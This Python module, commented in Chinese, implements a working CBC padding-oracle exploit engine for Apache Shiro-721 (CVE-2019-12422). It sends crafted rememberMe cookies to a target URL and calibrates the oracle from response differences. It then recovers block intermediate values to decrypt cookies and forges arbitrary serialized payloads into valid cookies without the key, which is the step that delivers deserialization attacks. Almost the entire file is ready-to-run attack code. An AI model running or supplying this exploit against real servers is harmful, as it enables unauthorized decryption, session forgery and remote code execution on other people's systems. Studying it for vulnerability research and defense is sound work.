#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Shiro-721（CVE-2019-12422）CBC Padding Oracle 引擎。

完整实现：

    recover_block(C)   恢复单个密文块的中间值 D(C)（逐字节 256 次猜测）
    recover_cookie()   不知道密钥，解出任意**合法** Cookie 的明文
    forge(payload)     不需要密钥，把任意序列化 payload 加密成合法 Cookie

前提（必须自行确认）：目标对不同 padding 的响应存在可区分差异。真实 Shiro
默认对「解密失败」和「反序列化失败」都会回 deleteMe，因此能否利用取决于目标
的异常处理/前置代理是否泄漏差异。本模块的 ``calibrate()`` 会先用随机密文探测
目标是否存在这种差异，**没有差异就直接报错退出**，不会假装成功。

算法（CBC 后向构造）：
    已知 D(C_n) 后，令 C_{n-1} = D(C_n) XOR P_n，即可让第 n 块明文等于目标值；
    再恢复 D(C_{n-1})，继续向前，最后得到 IV = D(C_1) XOR P_1。
"""

from __future__ import annotations

import base64
import hashlib
import os
import random
import time
from dataclasses import dataclass

from . import aes
from .httpc import HttpClient, Response, normalize_base


class OracleUnavailable(RuntimeError):
    pass


class OracleError(RuntimeError):
    pass


@dataclass
class OracleSpec:
    kind: str = "auto"          # auto | status | body | header | length | timing
    value: str | None = None
    invert: bool = False


@dataclass
class Calibration:
    ok: bool
    spec: OracleSpec | None = None
    note: str = ""
    probes: int = 0


class PaddingOracle:
    def __init__(self, client: HttpClient, url: str, spec: OracleSpec | None = None,
                 verbose: bool = True, probe_delay: float = 0.0):
        self.client = client
        self.url = normalize_base(url) + "/"
        self.spec = spec or OracleSpec()
        self.verbose = verbose
        self.probe_delay = probe_delay
        self.requests = 0
        self.cache: dict[str, bool] = {}
        self._major_sig: tuple | None = None
        self._valid_sig: tuple | None = None
        self.started = time.time()

    # -- 底层请求 ---------------------------------------------------------- #
    def _raw(self, cookie_bytes: bytes) -> Response:
        cookie = base64.b64encode(cookie_bytes).decode("ascii")
        resp = self.client.get(self.url, headers={"Cookie": f"rememberMe={cookie}"})
        self.requests += 1
        if self.probe_delay:
            time.sleep(self.probe_delay)
        return resp

    @staticmethod
    def _signature(resp: Response) -> tuple:
        body_hash = hashlib.md5(resp.body).hexdigest()[:10]
        return (resp.status, len(resp.body), body_hash, resp.error)

    def _matches(self, resp: Response) -> bool:
        kind = self.spec.kind
        value = self.spec.value
        if kind == "status":
            ok = str(resp.status) == str(value)
        elif kind == "body":
            ok = bool(value) and value in resp.text
        elif kind == "header":
            blob = "\n".join(f"{k}: {v}" for k, v in resp.headers)
            ok = bool(value) and value.lower() in blob.lower()
        elif kind == "length":
            ok = str(len(resp.body)) == str(value)
        elif kind == "timing":
            ok = resp.elapsed >= float(value or 0)
        elif kind == "signature":
            ok = self._valid_sig is not None and self._signature(resp) == self._valid_sig
        else:
            raise OracleUnavailable("oracle 未校准")
        return (not ok) if self.spec.invert else ok

    def check(self, cookie_bytes: bytes) -> bool:
        """True = 服务端认为 padding 合法。"""
        key = base64.b64encode(cookie_bytes).decode("ascii")
        if key in self.cache:
            return self.cache[key]
        resp = self._raw(cookie_bytes)
        ok = self._matches(resp)
        self.cache[key] = ok
        return ok

    # -- 校准 -------------------------------------------------------------- #
    def calibrate(self, probes: int = 600, max_probes: int = 1800) -> Calibration:
        if self.spec.kind != "auto":
            note = f"使用显式 oracle: {self.spec.kind}={self.spec.value}"
            if self.verbose:
                print(f"[*] {note}")
            return Calibration(True, self.spec, note, 0)

        if self.verbose:
            print(f"[*] 校准 padding oracle：先发 {probes} 个随机密文，"
                  "观察目标是否存在响应差异…")
        sigs: dict[tuple, int] = {}
        samples: dict[tuple, bytes] = {}
        total = 0
        while total < probes:
            cookie = bytes(random.randbytes(32))
            resp = self._raw(cookie)
            total += 1
            sig = self._signature(resp)
            sigs[sig] = sigs.get(sig, 0) + 1
            samples.setdefault(sig, cookie)
        major = max(sigs, key=lambda s: sigs[s])
        minority = [s for s in sigs if s != major]
        if self.verbose:
            print(f"    收到 {len(sigs)} 种响应特征，主特征 {major[:2]}，"
                  f"其它特征 {len(minority)} 种")

        if not minority and probes < max_probes:
            # 合法 padding 本身只有约 1/256 概率，需要更多样本才能观察到
            extra = max_probes - probes
            if self.verbose:
                print(f"    未发现差异，追加 {extra} 个随机样本…")
            return self.calibrate(probes=max_probes, max_probes=max_probes)

        for candidate in minority:
            sample = bytearray(samples[candidate])
            sample[15] ^= 0xFF          # 破坏最后一个明文字节 => padding 必然非法
            resp = self._raw(bytes(sample))
            if self._signature(resp) == major:
                self._valid_sig = candidate
                self._major_sig = major
                self.spec = OracleSpec(kind="signature")
                note = (f"检测到 padding 有效时的响应特征 {candidate[:2]}，"
                        f"样本数 {sigs[candidate]}/{total}")
                if self.verbose:
                    print(f"[+] {note}")
                return Calibration(True, self.spec, note, total)

        note = ("目标对随机密文只有一种响应，无法区分 padding 合法/非法；"
                "该目标不能做 Shiro-721（或需要显式 --oracle 指定判定条件）")
        if self.verbose:
            print(f"[-] {note}")
        return Calibration(False, None, note, total)

    # -- 核心：恢复一个块的中间值 ------------------------------------------ #
    def _probe(self, block: bytes, intermediate: bytes, idx: int, pad: int,
               guess: int, flip: bool = False) -> bool:
        """构造 ``IV || block`` 并询问 oracle。

        未确定的 IV 字节使用固定填充（0x00），而不是随机值：
        随机填充会让「更长的合法 padding」以约 1/256 的概率误命中，
        固定填充把这种巧合压到 1/256（每块）并可被 flip 校验识别。
        """
        iv = bytearray(16)
        for j in range(idx + 1, 16):
            iv[j] = intermediate[j] ^ pad
        iv[idx] = guess
        if flip and idx > 0:
            # 翻转一个“无关”字节：若命中的是长度 pad 的填充，结果应仍合法；
            # 若其实是更长填充（假阳性），翻转会破坏它。
            iv[idx - 1] ^= 0xFF
        return self.check(bytes(iv) + block)

    def recover_block(self, block: bytes, verify: bool = True) -> bytes:
        if len(block) != 16:
            raise ValueError("block 必须为 16 字节")
        intermediate = bytearray(16)
        for pad in range(1, 17):
            idx = 16 - pad
            found = False
            for guess in range(256):
                if not self._probe(block, intermediate, idx, pad, guess):
                    continue
                if idx > 0 and not self._probe(block, intermediate, idx, pad,
                                               guess, flip=True):
                    continue          # 假阳性（实际是更长的 padding）
                intermediate[idx] = guess ^ pad
                found = True
                break
            if not found:
                raise OracleError(
                    f"第 {idx} 字节在 pad={pad} 时没有任何猜测命中，"
                    "oracle 判定可能不稳定（可尝试 --oracle 显式指定）")
            if self.verbose and pad % 4 == 0:
                print(f"      块进度 {pad}/16（已发 {self.requests} 个请求）")
        result = bytes(intermediate)
        if verify:
            self.verify_block(block, result)
        return result

    def verify_block(self, block: bytes, intermediate: bytes) -> bool:
        """用多个 pad 值交叉验证恢复出的中间值，防止假阳性。"""
        for pad in (1, 2, 3):
            iv = bytearray(16)
            for j in range(16 - pad, 16):
                iv[j] = intermediate[j] ^ pad
            if not self.check(bytes(iv) + block):
                raise OracleError(f"中间值自检失败（pad={pad}），oracle 可能不稳定")
        return True

    # -- 解密任意合法 Cookie ---------------------------------------------- #
    def recover_cookie(self, cookie_b64: str, max_blocks: int | None = None) -> bytes:
        raw = base64.b64decode(cookie_b64, validate=False)
        if len(raw) <= 16 or (len(raw) - 16) % 16:
            raise ValueError(f"Cookie 长度非法: {len(raw)} 字节")
        iv = raw[:16]
        blocks = [raw[16 + i * 16:32 + i * 16] for i in range((len(raw) - 16) // 16)]
        if max_blocks:
            blocks = blocks[:max_blocks]
        plaintext = bytearray()
        prev = iv
        for index, block in enumerate(blocks, 1):
            if self.verbose:
                print(f"[*] 恢复第 {index}/{len(blocks)} 块…")
            d = self.recover_block(block)
            plaintext += bytes(a ^ b for a, b in zip(d, prev))
            prev = block
        return bytes(plaintext)

    # -- 构造任意 Cookie --------------------------------------------------- #
    def forge(self, payload: bytes) -> str:
        data = aes.pkcs7_pad(payload)
        blocks = [data[i:i + 16] for i in range(0, len(data), 16)]
        if self.verbose:
            print(f"[*] 目标明文 {len(payload)} 字节，填充后 {len(data)} 字节，"
                  f"{len(blocks)} 个密文块")
        chain: list[bytes] = []
        current = bytes(random.randbytes(16))
        d = self.recover_block(current)
        chain.append(current)
        for i in range(len(blocks) - 1, 0, -1):
            prev = bytes(a ^ b for a, b in zip(d, blocks[i]))
            d = self.recover_block(prev)
            chain.append(prev)
        iv = bytes(a ^ b for a, b in zip(d, blocks[0]))
        cookie = iv + b"".join(reversed(chain))
        if self.verbose:
            print(f"[+] 构造完成：共 {self.requests} 个请求，"
                  f"耗时 {time.time() - self.started:.1f}s")
        return base64.b64encode(cookie).decode("ascii")

    # -- 自检 & 统计 ------------------------------------------------------- #
    def self_test(self) -> bool:
        """用一个随机块走一遍完整恢复流程，确认 oracle 真实可用。"""
        block = bytes(random.randbytes(16))
        self.recover_block(block, verify=True)
        return True
